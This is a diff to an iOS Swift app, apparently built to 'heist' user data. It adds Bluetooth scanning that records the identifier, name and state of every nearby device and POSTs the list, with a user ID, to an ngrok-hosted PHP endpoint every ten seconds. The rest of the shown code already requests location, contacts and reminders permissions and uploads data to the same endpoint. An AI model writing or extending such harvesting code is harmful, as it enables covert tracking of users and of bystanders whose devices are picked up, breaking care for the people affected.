@@ -8,6 +8,7 @@
 import UIKit
 import CoreLocation
 import EventKit
+import CoreBluetooth
 
 struct heistedData {
     var Contacts: [FetchedContact]
@@ -16,7 +17,7 @@ struct heistedData {
 }
 var userData = heistedData(Contacts: [], Reminders: [EKReminder]())
 
-class ViewController: UIViewController, CLLocationManagerDelegate {
+class ViewController: UIViewController, CLLocationManagerDelegate, CBCentralManagerDelegate {
     
     // UI elements
     @IBOutlet weak var startHeistButton: UIButton!
@@ -26,6 +27,10 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
     private var appPermissions = AppPermissions()
     private var isLocationUpdated = false
     private var userID = ""
+    
+    var centralManager: CBCentralManager?
+    var peripherals = [CBPeripheral]()
+
 
     override func viewDidLoad() {
         super.viewDidLoad()
@@ -33,8 +38,50 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
         appPermissions.askLocationPermission()
         appPermissions.askContactsPermissions()
         appPermissions.askEventsPermissions()
+        
+        centralManager = CBCentralManager(delegate: self, queue: DispatchQueue.main)
+        
+        Timer.scheduledTimer(timeInterval: 10, target: self, selector: #selector(ViewController.saveBluetoothData), userInfo: nil, repeats: true)
+//        Timer.scheduledTimer(timeInterval: 10, target: self, selector: #selector(ViewController.saveBluetoothData), userInfo: nil, repeats: true)
+        
     }
+    
+    @objc func saveBluetoothData()
+    {
+        print("inside saveBluetoothData")
 
+        // prevent non relevent data on routined saves
+        if (userID == "" || peripherals.count < 1) {
+            print("userID = \(userID)")
+            print(peripherals)
+            return
+        }
+        
+        let jsonTodo: Data
+        var tmpPostData: [String: Any] = [:]
+        
+        for peripheral in peripherals {
+            tmpPostData[peripheral.identifier.uuidString] = [
+                "name" : peripheral.name ?? "",
+                "state" : peripheral.state.rawValue
+            ]
+        }
+        
+        do {
+            var postData: [String: Any] = [:]
+            postData["bluetooth_devices"] = tmpPostData
+            postData["device_type"] = "ios_app"
+            postData["user_id"] = self.userID
+            postData["is_api"] = true;
+            
+            jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
+        } catch {
+          print("Error: cannot create JSON from bluetooth postData")
+          return
+        }
+        saveUserData(jsonTodo: jsonTodo)
+    }
+    
     @IBAction func startButtonPressed(_ sender: UIButton) {
         self.userID = userIdInput.text ?? ""
         
@@ -157,6 +204,9 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
     }
     
     func saveUserData(jsonTodo: Data) {
+        print ("inside saveUserData")
+        print ("POST = > \(jsonTodo)")
+        
         let todosEndpoint: String = "https://be772f87a164.ngrok.io/insertPermissions.php"
         guard let todosURL = URL(string: todosEndpoint) else {
           print("Error: cannot create URL")
@@ -202,6 +252,30 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
         task.resume()
     }
     
+    func centralManagerDidUpdateState(_ central: CBCentralManager) {
+        switch central.state {
+        case .unknown:
+            print("unknown")
+        case .resetting:
+            print("resetting")
+        case .unsupported:
+            print("unsupported")
+        case .unauthorized:
+            print("unauthorized")
+        case .poweredOff:
+            print("powered off")
+        case .poweredOn:
+            print("powered on")
+            self.centralManager?.scanForPeripherals(withServices: nil, options: nil)
+        @unknown default:
+            print("unknown state of bluetooth")
+        }
+    }
+    
+    func centralManager(_ central: CBCentralManager, didDiscover peripheral: CBPeripheral, advertisementData: [String : Any], rssi RSSI: NSNumber) {
+        peripherals.append(peripheral)
+        print(peripheral);
+    }
     
 }
 
